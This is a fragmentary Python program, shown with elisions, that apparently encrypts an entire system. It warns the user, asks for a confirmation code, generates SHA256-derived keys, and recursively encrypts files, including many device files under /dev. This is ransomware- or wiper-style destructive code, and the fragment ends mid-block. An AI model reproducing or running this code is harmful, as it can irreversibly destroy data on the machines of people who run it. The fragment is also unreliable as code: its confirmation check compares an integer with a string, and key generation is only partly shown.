...
def becareful():
    print("If you continue, your entire system will be encrypted.")

    randomly = randint(1000, 9999)
    print(randomly)
    verification = input("please verify above code:")
    if verification == randomly:
...
def generate_keys(source):
    ...
    keys = []
    for i in range(9):
        keys.append(SHA256.new(''.join(
            SystemRandom().choice(source) for x in range(SystemRandom().randint(128, 256)) for x in
            range(SystemRandom().randint(128, 256)))).digest())
        if i % 3 == 0:
            update_progress(((i + 1.0) / 3.0))
    print
    "\n"
...
def encrypt_dir(directory, key):
    ...
    if len(files) > 0:
        for file in files:
            ...
            try:
                if '/dev' in path[:4]:
                    if not any(substring in path for substring in
                               ('sg', 'fd', 'char', 'by-u', 'pts', 'cpu', 'mapper', 'input', 'bus', 'disk')):
                        if not any(substring in file for substring in (
                        'dm-', 'sda', 'port', 'vcs', 'tty', 'initctl', 'stderr', 'stdin', 'stdout', 'sg', 'hidraw',
                        'psaux', 'ptmx', 'console', 'random', 'zero', 'mem', 'rfkill', 'card', 'control', 'pcm', 'seq',
                        'timer', '-', ':', 'disk', 'block', 'char')):
                            encrypt(path, key)
                else:
                    encrypt(path, key)
            except:
